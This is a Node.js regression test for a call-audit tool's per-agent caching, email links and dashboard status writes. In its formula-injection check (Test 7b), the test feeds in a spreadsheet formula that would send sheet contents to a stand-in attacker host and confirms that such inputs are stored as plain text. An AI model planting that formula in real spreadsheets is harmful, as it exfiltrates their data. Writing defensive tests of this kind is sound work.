/**
 * Regression test for "evaluation email links to another agent's audit".
 *
 * Reported symptom: an analyst audits agent A, but the evaluation link in the
 * audit email opens agent B's evaluation (often with a different observer).
 * Reports: Rose Anne Ocana, Rafael Rivas, Brayan Torress (Sep 29-30, 2026).
 *
 * Root cause: Interaction ID was treated as unique everywhere, but a
 * Repeats & Transfer call has several agents on ONE Interaction ID and each
 * agent is audited separately.
 *   - The result cache was keyed by Interaction ID + analysis type only, so a
 *     second agent got the first agent's cached result AND the first agent's
 *     audit ref, and no Audit_Log row was ever written for the second agent.
 *   - sendAuditEmail only checked that the ref existed, so the email (subject
 *     and recipients from the form) linked to the first agent's evaluation.
 *   - updateDashboardPDFLink_ wrote email status to the FIRST row with that
 *     Interaction ID instead of the row for the audit's own ref.
 *
 * This loads the REAL SheetService.gs and selected functions from Code.gs
 * into a sandbox with an in-memory fake spreadsheet, so the production logic
 * is what runs.
 *
 * Usage: node tests/multi-agent-audit-test.js
 * Exits non-zero if any check fails.
 */
const vm = require('vm');
const { read, extractFunction, FakeSheet, makeCheck } = require('./lib/gas-fakes');
const codeSrc = read('Code.gs');

function makeEnv() {
  const logs = [];
  const store = {};
  const scriptCache = {
    get: k => (k in store ? store[k] : null),
    put: (k, v) => { store[k] = v; },
    remove: k => { delete store[k]; },
  };
  const sandbox = {
    Logger: { log: m => logs.push(m) },
    CacheService: { getScriptCache: () => scriptCache },
    LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
    // Config.gs reads its secrets from Script Properties at load time.
    PropertiesService: { getScriptProperties: () => ({ getProperty: () => null }) },
    Utilities: { base64Encode: s => Buffer.from(String(s)).toString('base64'), sleep() {} },
    sharedCSS: () => '',
    fixBadgeClasses: h => h,
    invalidateDashboardCache_: () => {},
    ScriptApp: { getService: () => ({ getUrl: () => 'https://example.com/exec' }) },
  };
  sandbox.globalThis = sandbox;
  const ctx = vm.createContext(sandbox);
  vm.runInContext(read('Config.gs'), ctx);
  vm.runInContext(read('HtmlSanitizer.gs'), ctx);
  vm.runInContext(read('EmailGuard.gs'), ctx);
  vm.runInContext(read('SheetService.gs'), ctx);
  ['findAuditRefForInteraction_', '_findAuditRowIndex', 'updateDashboardPDFLink_', 'getEvaluationFromCache_', 'getEvalViewData', 'sendAuditEmail']
    .forEach(n => vm.runInContext(extractFunction(codeSrc, n), ctx));

  const sheets = {};
  sheets[ctx.AUDIT_LOG_SHEET]     = new FakeSheet(ctx.AUDIT_LOG_HEADERS, []);
  sheets[ctx.DASHBOARD_DATA_SHEET] = new FakeSheet(ctx.DASHBOARD_HEADERS, []);
  sheets[ctx.CACHE_SHEET]         = new FakeSheet(ctx.CACHE_HEADERS, []);
  const ss = {
    getSheetByName: n => sheets[n] || null,
    insertSheet: n => (sheets[n] = new FakeSheet([], [])),
    getUrl: () => 'https://sheet',
  };
  ctx.getOrCreateSpreadsheet = () => ss;
  return { ctx, sheets, logs, store };
}

function auditRow(ctx, o) {
  return ctx.AUDIT_LOG_HEADERS.map(h => (o[h] !== undefined ? o[h] : ''));
}
function dashRow(ctx, o) {
  return ctx.DASHBOARD_HEADERS.map(h => (o[h] !== undefined ? o[h] : ''));
}
function col(ctx, sheet, header, headers) {
  return headers.indexOf(header);
}

const check = makeCheck();

const INT = 'c1a2b3-interaction-1';
const SAP_A = '373106';   // first agent on the call
const SAP_B = '2008630';  // second agent on the same call
const HTML_A = '<div>EVALUATION FOR AGENT A</div>';
const HTML_B = '<div>EVALUATION FOR AGENT B</div>';

console.log('NH Analyzer — multi-agent audit test');

console.log('\nTest 1 — the cache is per agent: a second agent on the same Interaction ID is a MISS');
{
  const { ctx } = makeEnv();
  ctx.saveCachedResult_(INT, 'repeats', HTML_A, SAP_A);
  check('same agent hits the cache', ctx.findCachedResult_(INT, 'repeats', SAP_A) === HTML_A);
  check('a DIFFERENT agent on the same Interaction ID misses the cache',
        ctx.findCachedResult_(INT, 'repeats', SAP_B) === null,
        'got ' + JSON.stringify(ctx.findCachedResult_(INT, 'repeats', SAP_B)));
}

console.log('\nTest 2 — two agents on one Interaction ID keep separate cached evaluations');
{
  const { ctx } = makeEnv();
  ctx.saveCachedResult_(INT, 'repeats', HTML_A, SAP_A);
  ctx.saveCachedResult_(INT, 'repeats', HTML_B, SAP_B);
  check('agent A still gets A\'s evaluation after B was saved', ctx.findCachedResult_(INT, 'repeats', SAP_A) === HTML_A,
        'got ' + JSON.stringify(ctx.findCachedResult_(INT, 'repeats', SAP_A)));
  check('agent B gets B\'s evaluation', ctx.findCachedResult_(INT, 'repeats', SAP_B) === HTML_B);

  const EDITED_B = '<div>EVALUATION FOR AGENT B (edited)</div>';
  ctx.updateCachedResult_(INT, 'repeats', EDITED_B, SAP_B);
  check('editing B\'s evaluation does not touch A\'s', ctx.findCachedResult_(INT, 'repeats', SAP_A) === HTML_A);
  check('editing B\'s evaluation updates B\'s', ctx.findCachedResult_(INT, 'repeats', SAP_B) === EDITED_B);
}

console.log('\nTest 3 — legacy cache rows (no SAP column) are never served to a different agent');
{
  const { ctx, sheets } = makeEnv();
  // A row written before this fix: 4 columns, no SAP ID.
  sheets[ctx.CACHE_SHEET].appendRow([INT, 'repeats', new Date(), HTML_A]);
  sheets[ctx.AUDIT_LOG_SHEET].appendRow(auditRow(ctx, {
    'Audit Ref': 'NHA-20260929-0001', 'Interaction ID': INT, 'SAP ID': SAP_A,
    'Analysis Type': 'Repeats & Transfer Analyzer',
  }));
  check('the original agent (has an Audit_Log row) still hits the legacy row',
        ctx.findCachedResult_(INT, 'repeats', SAP_A) === HTML_A,
        'got ' + JSON.stringify(ctx.findCachedResult_(INT, 'repeats', SAP_A)));
  check('a different agent does NOT get the legacy row',
        ctx.findCachedResult_(INT, 'repeats', SAP_B) === null,
        'got ' + JSON.stringify(ctx.findCachedResult_(INT, 'repeats', SAP_B)));
}

console.log('\nTest 4 — findAuditRefForInteraction_ returns the ref of THIS agent\'s audit');
{
  const { ctx, sheets } = makeEnv();
  sheets[ctx.AUDIT_LOG_SHEET].appendRow(auditRow(ctx, {
    'Audit Ref': 'NHA-20260929-0001', 'Interaction ID': INT, 'SAP ID': SAP_A,
    'Analysis Type': 'Repeats & Transfer Analyzer',
  }));
  sheets[ctx.AUDIT_LOG_SHEET].appendRow(auditRow(ctx, {
    'Audit Ref': 'NHA-20260929-0002', 'Interaction ID': INT, 'SAP ID': SAP_B,
    'Analysis Type': 'Repeats & Transfer Analyzer',
  }));
  sheets[ctx.AUDIT_LOG_SHEET].appendRow(auditRow(ctx, {
    'Audit Ref': 'NHA-20260929-0003', 'Interaction ID': INT, 'SAP ID': SAP_B,
    'Analysis Type': 'Sales Analyzer',
  }));
  check('agent A gets ref 0001', ctx.findAuditRefForInteraction_(INT, 'repeats', SAP_A) === 'NHA-20260929-0001',
        'got ' + JSON.stringify(ctx.findAuditRefForInteraction_(INT, 'repeats', SAP_A)));
  check('agent B (repeats) gets ref 0002, not A\'s', ctx.findAuditRefForInteraction_(INT, 'repeats', SAP_B) === 'NHA-20260929-0002',
        'got ' + JSON.stringify(ctx.findAuditRefForInteraction_(INT, 'repeats', SAP_B)));
  check('agent B (sales) gets ref 0003', ctx.findAuditRefForInteraction_(INT, 'sales', SAP_B) === 'NHA-20260929-0003',
        'got ' + JSON.stringify(ctx.findAuditRefForInteraction_(INT, 'sales', SAP_B)));
  check('an agent with no audit gets nothing, not someone else\'s ref',
        ctx.findAuditRefForInteraction_(INT, 'repeats', '999999') === '',
        'got ' + JSON.stringify(ctx.findAuditRefForInteraction_(INT, 'repeats', '999999')));
}

// Two agents, one Interaction ID, two refs, two cached evaluations.
function twoAgentEnv() {
  const env = makeEnv();
  const { ctx, sheets } = env;
  [['NHA-20260929-0001', SAP_A, 'Fatima Paredes', HTML_A],
   ['NHA-20260929-0002', SAP_B, 'Rafael Rivas',   HTML_B]].forEach(a => {
    sheets[ctx.AUDIT_LOG_SHEET].appendRow(auditRow(ctx, {
      'Audit Ref': a[0], 'Submitted At': 'Tue Sep 29 2026 10:00:00 GMT+0800', 'Interaction ID': INT,
      'SAP ID': a[1], 'Team Member': a[2], 'Analysis Type': 'Repeats & Transfer Analyzer',
    }));
    sheets[ctx.DASHBOARD_DATA_SHEET].appendRow(dashRow(ctx, {
      'Audit Ref': a[0], 'Interaction ID': INT, 'SAP ID': a[1], 'Team Member': a[2],
    }));
    ctx.saveCachedResult_(INT, 'repeats', a[3], a[1]);
  });
  return env;
}

console.log('\nTest 5 — getEvaluationFromCache_ (dashboard "open evaluation") returns each audit\'s own evaluation');
{
  const { ctx } = twoAgentEnv();
  const a = ctx.getEvaluationFromCache_('NHA-20260929-0001');
  const b = ctx.getEvaluationFromCache_('NHA-20260929-0002');
  check('ref 0001 shows agent A\'s evaluation', a && a.html === HTML_A, 'got ' + JSON.stringify(a && a.html));
  check('ref 0002 shows agent B\'s evaluation', b && b.html === HTML_B, 'got ' + JSON.stringify(b && b.html));
}

console.log('\nTest 6 — getEvalViewData (the email link) returns each audit\'s own agent AND evaluation');
{
  const { ctx } = twoAgentEnv();
  const a = ctx.getEvalViewData('NHA-20260929-0001');
  const b = ctx.getEvalViewData('NHA-20260929-0002');
  check('ref 0001 is Fatima', a.success && a.meta['Team Member'] === 'Fatima Paredes', JSON.stringify(a.meta));
  check('ref 0002 is Rafael', b.success && b.meta['Team Member'] === 'Rafael Rivas', JSON.stringify(b.meta));
  check('ref 0001 body is A\'s evaluation', a.evalHtml === HTML_A, 'got ' + JSON.stringify(a.evalHtml));
  check('ref 0002 body is B\'s evaluation', b.evalHtml === HTML_B, 'got ' + JSON.stringify(b.evalHtml));
}

console.log('\nTest 6b — the "Previous Evaluations" table gets the names the page reads, and a report still being processed is not cached');
{
  const { ctx, sheets, store } = twoAgentEnv();
  // a second and a Sales audit of agent A (same SAP ID), so A has previous evaluations
  [['NHA-20260930-0001', 'INT-OTHER-1', 'Sales Analyzer'], ['NHA-20260930-0002', 'INT-OTHER-2', 'Repeats & Transfer Analyzer']].forEach(a => {
    sheets[ctx.AUDIT_LOG_SHEET].appendRow(auditRow(ctx, { 'Audit Ref': a[0], 'Submitted At': '2026-09-30', 'Interaction ID': a[1], 'SAP ID': SAP_A, 'Team Member': 'Fatima Paredes', 'Analysis Type': a[2] }));
  });
  const r = ctx.getEvalViewData('NHA-20260929-0001');
  const byRef = {}; (r.recent || []).forEach(x => { byRef[x.ref] = x; });
  check('the two other audits of the same agent are listed', !!byRef['NHA-20260930-0001'] && !!byRef['NHA-20260930-0002'], JSON.stringify(r.recent));
  check('each row has interactionId (EvalView.html shows "—" without it)', byRef['NHA-20260930-0001'] && byRef['NHA-20260930-0001'].interactionId === 'INT-OTHER-1', JSON.stringify(byRef['NHA-20260930-0001']));
  check('each row has analysisType, so a Sales audit is tagged Sales (it said Repeats for all)', byRef['NHA-20260930-0001'] && /sales/i.test(byRef['NHA-20260930-0001'].analysisType) && /repeats/i.test(byRef['NHA-20260930-0002'].analysisType), JSON.stringify(r.recent));
  check('the old fields are still there for anything that reads them', byRef['NHA-20260930-0001'] && byRef['NHA-20260930-0001'].ban === 'INT-OTHER-1' && !!byRef['NHA-20260930-0001'].date);

  // an audit whose report is not saved yet: show it, but do not remember "being processed" for 6 hours
  const before = Object.keys(store).filter(k => k.indexOf('ev2_') === 0).length;
  const pending = ctx.getEvalViewData('NHA-20260930-0002');
  const after = Object.keys(store).filter(k => k.indexOf('ev2_') === 0).length;
  check('an audit with no saved report comes back without an evaluation', pending.success && !pending.evalHtml, JSON.stringify(pending.evalHtml));
  check('and is NOT cached (it would stay "being processed" for 6 hours)', after === before, before + ' -> ' + after);
  const done = ctx.getEvalViewData('NHA-20260929-0001');
  check('a finished report IS cached', Object.keys(store).some(k => k.indexOf('ev2_') === 0) && done.evalHtml === HTML_A);
}

console.log('\nTest 7 — updateDashboardPDFLink_ writes to the row of the audit\'s own ref');
{
  const { ctx, sheets } = twoAgentEnv();
  ctx.updateDashboardPDFLink_(INT, 'Sent', ['b@telus.com'], 'NHA-20260929-0002', 'Yes');
  const dH = ctx.DASHBOARD_HEADERS, lH = ctx.AUDIT_LOG_HEADERS;
  const d = sheets[ctx.DASHBOARD_DATA_SHEET].grid, l = sheets[ctx.AUDIT_LOG_SHEET].grid;
  const dStatus = dH.indexOf('Email Status'), lStatus = lH.indexOf('Email Status'), lRecip = lH.indexOf('Recipients');
  check('Dashboard_Data: agent B\'s row marked Sent', d[2][dStatus] === 'Sent', 'got ' + JSON.stringify(d[2][dStatus]));
  check('Dashboard_Data: agent A\'s row NOT touched', !d[1][dStatus], 'got ' + JSON.stringify(d[1][dStatus]));
  check('Audit_Log: agent B\'s row marked Sent', l[2][lStatus] === 'Sent', 'got ' + JSON.stringify(l[2][lStatus]));
  check('Audit_Log: agent A\'s row NOT touched', !l[1][lStatus], 'got ' + JSON.stringify(l[1][lStatus]));
  check('Audit_Log: recipients written to B\'s row only', l[2][lRecip] === 'b@telus.com' && !l[1][lRecip]);
}

console.log('\nTest 7b — nothing written by updateDashboardPDFLink_ can become a formula');
{
  const { ctx, sheets } = twoAgentEnv();
  const dH = ctx.DASHBOARD_HEADERS, lH = ctx.AUDIT_LOG_HEADERS;
  const d = () => sheets[ctx.DASHBOARD_DATA_SHEET].grid, l = () => sheets[ctx.AUDIT_LOG_SHEET].grid;
  const dRes = dH.indexOf('Issue Resolved'), lRes = lH.indexOf('Issue Resolved'), lRecip = lH.indexOf('Recipients'), lStatus = lH.indexOf('Email Status'), dStatus = dH.indexOf('Email Status');
  d()[2][dRes] = 'No'; l()[2][lRes] = 'No';
  ctx.updateDashboardPDFLink_(INT, 'Sent', ['b@telus.com'], 'NHA-20260929-0002', '=IMPORTDATA("https://evil.example/?"&JOIN(",",A2:A))');
  check('a formula as the Issue Resolved override is ignored: the cells keep their value', d()[2][dRes] === 'No' && l()[2][lRes] === 'No', JSON.stringify([d()[2][dRes], l()[2][lRes]]));
  ctx.updateDashboardPDFLink_(INT, 'Sent', ['b@telus.com'], 'NHA-20260929-0002', 'Whatever the analyst typed here');
  check('free text as the override is ignored too (only Yes, No or Partial are accepted)', d()[2][dRes] === 'No' && l()[2][lRes] === 'No');
  ctx.updateDashboardPDFLink_(INT, 'Sent', ['b@telus.com'], 'NHA-20260929-0002', ' yes ');
  check('"yes" in any case is stored as Yes', d()[2][dRes] === 'Yes' && l()[2][lRes] === 'Yes');
  ctx.updateDashboardPDFLink_(INT, 'Sent', ['b@telus.com'], 'NHA-20260929-0002', 'Partially resolved');
  check('Partially resolved is accepted as it is', d()[2][dRes] === 'Partially resolved');
  ctx.updateDashboardPDFLink_(INT, '=1+1', ['=cmd@telus.com', '+x@telus.com'], 'NHA-20260929-0002', '');
  check('a status or recipients list that starts with = or + is stored as text (apostrophe guard)', l()[2][lStatus] === "'=1+1" && d()[2][dStatus] === "'=1+1" && l()[2][lRecip] === "'=cmd@telus.com, +x@telus.com", JSON.stringify([l()[2][lStatus], l()[2][lRecip]]));
  ctx.updateDashboardPDFLink_(INT, 'Sent', ['a@telus.com'], 'NHA-20260929-0002', '');
  check('a blank override leaves the answer alone', d()[2][dRes] === 'Partially resolved');
}

console.log('\nTest 8 — sendAuditEmail refuses to send when the form does not match the saved audit');
{
  function runSend(form, auditRows) {
    let sent = 0;
    const { ctx } = makeEnv();
    Object.assign(ctx, {
      readAuditLog_: () => auditRows.map(r => Object.assign({ 'Observer Name': 'QA One' }, r)),
      Session: { getActiveUser: () => ({ getEmail: () => 'analyst@telus.com' }) },
      resolveObserver_: () => ({ name: 'QA One', email: 'analyst@telus.com' }),
      ADMIN_USERNAMES: [], ADMIN_DOMAIN: 'telus.com',
      getRecipientsFromRoster_: () => [],
      buildAuditRecipients_: () => ['agent@telus.com'],
      buildAgentEmailHTML: () => '<html></html>',
      sendEmailInBatches_: () => { sent++; },
      extractTextBlock: () => 'Yes',
      updateDashboardPDFLink_: () => {}, notifyAdmins_: () => {}, updateCachedResult_: () => {},
      logSubmissionError_: () => {},
    });
    return { result: ctx.sendAuditEmail(form, '<html>report</html>'), sent: () => sent };
  }
  const rows = [{ 'Audit Ref': 'NHA-20260929-0001', 'SAP ID': SAP_A, 'Interaction ID': INT }];
  const base = { auditRef: 'NHA-20260929-0001', participant: 'Fatima Paredes', sapId: SAP_A,
                 interactionId: INT, analysisType: 'repeats', startTime: '2026-09-29' };

  let r = runSend(base, rows);
  check('matching form is sent', r.result.success === true && r.sent() === 1, JSON.stringify(r.result));

  r = runSend(Object.assign({}, base, { sapId: SAP_B, participant: 'Rafael Rivas' }), rows);
  check('form for a DIFFERENT agent (SAP ID) is rejected', r.result.success === false, JSON.stringify(r.result));
  check('nothing was emailed on SAP mismatch', r.sent() === 0);
  check('rejection tells the analyst to Clear All and re-process',
        /Clear All/.test(r.result.error || ''), JSON.stringify(r.result.error));

  r = runSend(Object.assign({}, base, { interactionId: 'some-other-call' }), rows);
  check('form for a DIFFERENT Interaction ID is rejected and not emailed', r.result.success === false && r.sent() === 0,
        JSON.stringify(r.result));

  r = runSend(Object.assign({}, base, { interactionId: '' }), rows);
  check('blank Interaction ID on the form is not treated as a mismatch', r.result.success === true && r.sent() === 1,
        JSON.stringify(r.result));

  r = runSend(Object.assign({}, base, { sapId: ' ' + SAP_A + ' ' }), rows);
  check('whitespace around the SAP ID is tolerated', r.result.success === true && r.sent() === 1, JSON.stringify(r.result));
}

console.log(check.state.failures === 0 ? '\nALL TESTS PASSED' : '\n' + check.state.failures + ' CHECK(S) FAILED');
process.exit(check.state.failures === 0 ? 0 : 1);
